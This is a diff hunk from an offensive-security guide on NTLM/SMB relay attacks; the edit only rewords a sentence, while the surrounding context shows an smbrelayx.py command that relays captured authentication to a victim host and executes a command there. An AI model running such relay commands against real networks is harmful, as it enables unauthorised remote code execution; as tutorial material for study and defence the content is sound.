@@ -254,7 +254,7 @@ Force authentication by crafting a HTML or file of your choice:
 </html>
 ```
 
-Fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them to victim2@10.0.0.6 and will attempt to execute a command ipconfigon the end host:
+Fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them to the victim and will attempt to execute the command, ipconfig, on the end host:
 
 ```
 smbrelayx.py -h <Victim IP> -c "ipconfig"
